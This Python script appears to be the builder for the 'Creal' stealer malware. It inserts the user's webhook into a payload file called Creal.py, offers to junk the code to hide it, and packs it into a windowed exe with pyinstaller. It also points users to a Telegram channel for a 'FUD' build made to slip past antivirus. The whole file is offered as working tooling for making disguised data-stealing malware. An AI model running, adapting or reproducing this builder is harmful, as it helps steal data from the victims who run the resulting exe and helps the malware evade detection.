from pystyle import Write, Colors
import os
import subprocess
import requests
from colorama import Fore, Style
import time

intro = """

  /$$$$$$  /$$$$$$$  /$$$$$$$$  /$$$$$$  /$$             /$$
 /$$__  $$| $$__  $$| $$_____/ /$$__  $$| $$            | $$
| $$  \__/| $$  \ $$| $$      | $$  \ $$| $$            | $$
| $$      | $$$$$$$/| $$$$$   | $$$$$$$$| $$            | $$
| $$      | $$__  $$| $$__/   | $$__  $$| $$            |__/
| $$    $$| $$  \ $$| $$      | $$  | $$| $$                
|  $$$$$$/| $$  | $$| $$$$$$$$| $$  | $$| $$$$$$$$       /$$
 \______/ |__/  |__/|________/|__/  |__/|________/      |__/
                                                            
                                                            
                 by ayhu & artonus                                         

"""

Write.Print(intro, Colors.blue_to_green, interval=0.01)

time.sleep(1)

os.system('clear' if os.name == 'posix' else 'cls')

while True:
    
    Write.Print("\nWhich option do you want to choose?", Colors.blue_to_green)
    Write.Print("\n1. Build Exe", Colors.blue_to_green)
    Write.Print("\n2. Build Fud Exe", Colors.blue_to_green)
    Write.Print("\n3. Close", Colors.blue_to_green)
    Write.Print("\nMake your selection: ", Colors.red_to_yellow, end="")
    choice = input()

    if choice == "1":
        webhook = input(Fore.CYAN + "\nEnter Your Webhook: " + Style.RESET_ALL)

        filename = "Creal.py"
        filepath = os.path.join(os.getcwd(), filename)
        with open(filepath, "r", encoding="utf-8") as f:
            content = f.read()
        new_content = content.replace('"WEBHOOK HERE"', f'"{webhook}"')
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(new_content)
        Write.Print(f"\n{filename} file updated.", Colors.red_to_yellow)

        obfuscate = False
        while True:
            answer = input(Fore.CYAN + "\nDo you want to junk your code? (Recommended) (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                os.system("python junk.py")
                Write.Print(f"\n{filename} The file has been junked.", Colors.red_to_yellow)
                break
            elif answer.upper() == "N":
                break
            else:
                Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_purple)

        while True:
            answer = input(Fore.CYAN + "\nDo you want to make exe file? (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                if not obfuscate:
                    cmd = f"pyinstaller --onefile --windowed {filename}"
                else:
                    cmd = f"pyinstaller --onefile --windowed {filename} --name {filename.split('.')[0]}"
                subprocess.call(cmd, shell=True)
                Write.Print(f"\n{filename} The file has been converted to exe.", Colors.red_to_yellow)
                break
            elif answer.upper() == "N":
                break
            else:
                Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_purple)

    elif choice == "2":
        Write.Print("\nWe can share the fud for free but not now if you want to get it now: https://t.me/crealdevelopment", Colors.red_to_yellow)

    elif choice == "3":
        Write.Print("\nExiting the program...", Colors.red_to_yellow)
        break

    else:
        Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_purple)
